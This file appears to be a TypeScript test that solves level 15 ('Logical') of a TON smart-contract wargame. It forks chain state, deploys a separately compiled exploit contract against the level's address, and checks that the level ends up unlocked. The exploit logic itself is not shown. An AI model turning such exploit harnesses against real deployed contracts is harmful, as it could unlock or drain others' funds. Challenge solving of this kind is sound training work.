import {
    Blockchain,
    RemoteBlockchainStorage,
    SandboxContract,
    TreasuryContract,
    wrapTonClient4ForRemote,
} from '@ton/sandbox';
import { Address, beginCell, Cell, toNano } from '@ton/core';
import '@ton/test-utils';
import { compile } from '@ton/blueprint';
import { TonClient4 } from '@ton/ton';
import { Logical, LogicalExploit } from '../wrappers/wrappers/Logical';

// npx blueprint test 15. Logical.spec.ts
describe('Logical', () => {
    let level_code: Cell;
    let exploit_code: Cell;

    beforeAll(async () => {
        level_code = await compile('Logical');
        exploit_code = await compile('LogicalExploit');
    });

    let blockchain: Blockchain;
    let deployer: SandboxContract<TreasuryContract>;
    let level: SandboxContract<Logical>;
    let exploit: SandboxContract<LogicalExploit>;

    const level_addr = Address.parse('EQCDz4H_9i8BYRRezgaFmzvvUx_ge8DOBwv7nXil5ht4_64f');
    beforeEach(async () => {
        blockchain = await Blockchain.create({
            storage: new RemoteBlockchainStorage(
                wrapTonClient4ForRemote(
                    new TonClient4({
                        endpoint: 'https://sandbox-v4.tonhubapi.com',
                    }),
                ),
            ),
        });
        deployer = await blockchain.treasury('deployer');

        level = blockchain.openContract(Logical.createFromAddress(level_addr));
    });

    it('Exploit', async () => {
        console.log('Locked', await level.getLocked());
        console.log('LogicalTimeDiff', await level.getLogicalTimeDiff());
        console.log('PrevLogicalTime', await level.getPrevLogicalTime());

        exploit = blockchain.openContract(LogicalExploit.createFromConfig({}, exploit_code));

        await exploit.sendExploit(deployer.getSender(), toNano('0.25'), level_addr);

        expect(await level.getLocked()).toEqual(false);
    });
});
